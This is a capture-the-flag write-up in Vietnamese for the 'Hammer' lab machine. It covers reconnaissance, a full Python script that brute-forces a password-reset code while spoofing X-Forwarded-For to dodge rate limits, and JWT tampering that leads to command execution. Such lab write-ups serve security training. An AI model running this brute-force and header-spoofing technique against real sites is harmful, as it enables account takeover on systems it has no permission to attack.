# Hammer

## Challenge

- Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.

![image.png](/image/image.png)

## Recon

- Sử dụng `nmap` để quét các cổng dịch vụ `sV` của **10.10.216.73**

```bash
nmap -sV -sC -p- 10.10.216.73 -T4
```

![image.png](/image/image%201.png)

→ Port 22 sử dụng `ssh` version `OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)`

→ Port 1337 sử dụng `http` version `Apache httpd 2.4.41 ((Ubuntu))`

- Truy cập vào trang web [`http://10.10.216.73:1337`](http://10.10.216.73:1337)

![image.png](/image/image%202.png)

- Quét thư mục trang web

```bash
gobuster dir -u 'http://10.10.216.73:1337' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![image.png](/image/image%203.png)

```bash
ffuf -u http://10.10.216.73:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![image.png](/image/image%204.png)

## Exploitation

- Một số dir được khám phá: `logs` , `vendor`

![image.png](/image/image%205.png)

→ Tuy nhiên khi truy cập sâu vào các file mã nguồn, trang web đã ẩn đi

![image.png](/image/image%206.png)

- Khi `view-source`, thấy comments gợi ý

![image.png](/image/image%207.png)

→ Thử lại với `hmr_logs`

![image.png](/image/image%208.png)

- Truy cập vào endpoint `error.logs`

![image.png](/image/image%209.png)

→ Thông tin về 1 tài khoản có tên `tester@hammer.thm` 

- Quay lại tính năng reset password

![image.png](/image/image%2010.png)

![image.png](/image/image%2011.png)

- Quan sát trên burp thấy có `Rate-Limit-Pending` 
    - Khi thực hiện mỗi yêu cầu, giá trị `Rate-Limit-Pending` trong response header sẽ giảm dần. Ban đầu, giá trị này là 9.

    - Sau khi giá trị này giảm xuống 0, giới hạn rate limit bị đạt tới và token không thể được reset. Ban đầu, tác giả nhầm tưởng rằng reset token sẽ được làm mới với mỗi lần reset, khiến họ nghĩ rằng chỉ có thể lấy được token mới một cách may mắn.

    - Phát hiện quan trọng: Reset token tồn tại trong 180 giây, không bị reset khi tạo `PHPSESSID` mới.Nếu yêu cầu reset mà không có cookie, hệ thống sẽ cấp một session mới. Nếu lấy `PHPSESSID` từ response và sử dụng nó, sẽ có lại 8 lần thử, nhưng sau 180 giây, mọi thứ được reset.

![image.png](/image/image%2012.png)


- Dựa trên thông tin trên, họ có thể tự động brute force quy trình khôi phục mật khẩu bằng cách:
    - Gửi yêu cầu đặt lại mật khẩu để lấy `PHPSESSID` mới.
    - Gửi mã khôi phục mật khẩu liên tục.
    - Cứ sau 7 lần thử, làm mới `PHPSESSID` để có lại 8 lần thử mới.
    - Kiểm tra phản hồi để phát hiện khi nào mật khẩu được đặt lại thành công bằng cách so sánh sự thay đổi số lượng từ trong phản hồi.

```python
import requests
import random
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://10.10.216.73:1337/reset_password.php"
num_threads = 50
stop_flag = threading.Event()

# Retry mechanism
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504],
    raise_on_status=False
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)

def brute_force_code(start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                },
                timeout=10,
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            elif "Invalid or expired recovery code!" not in r.text:
                stop_flag.set()
                print(f"[+] Found the recovery code: {code_str}")
                print("[+] Sending the new password request.")
                new_password = "Password123"
                session.post(
                    url,
                    data={
                        "new_password": new_password,
                        "confirm_password": new_password,
                    },
                    headers={
                        "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    },
                )
                print(f"[+] Password is set to {new_password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

def main():
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```
- [Code](/bf.py)

![image.png](/image/image%2013.png)

- Login với mật khẩu mới

![image.png](/image/image%2014.png)

- Nhập thử vào ô `Enter command` và bắt request ở burp

![image.png](/image/image%2015.png)

```xml
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4NjgzMzg3LCJleHAiOjE3Mzg2ODY5ODcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.4dIrj5TZf0aC8yCiUdDCRcl2C88SAY5KWc4SmMwr_kk
```

→ Token leak từ trang web

![image.png](/image/image%2016.png)

- Thử sửa một chút ở burp

![image.png](/image/image%2017.png)

→ Đặt `persistentSession=yes` và payload OS injection thành `ls` 

→ `188ade1.key` leak

![image.png](/image/image%2018.png)

![image.png](/image/image%2019.png)

- Thử đọc flag nhưng không được

![image.png](/image/image%2020.png)

- Quay lại sửa tiếp ở jwt

![image.png](/image/image%2021.png)

- Quay lại và đọc file flag

![image.png](/image/image%2022.png)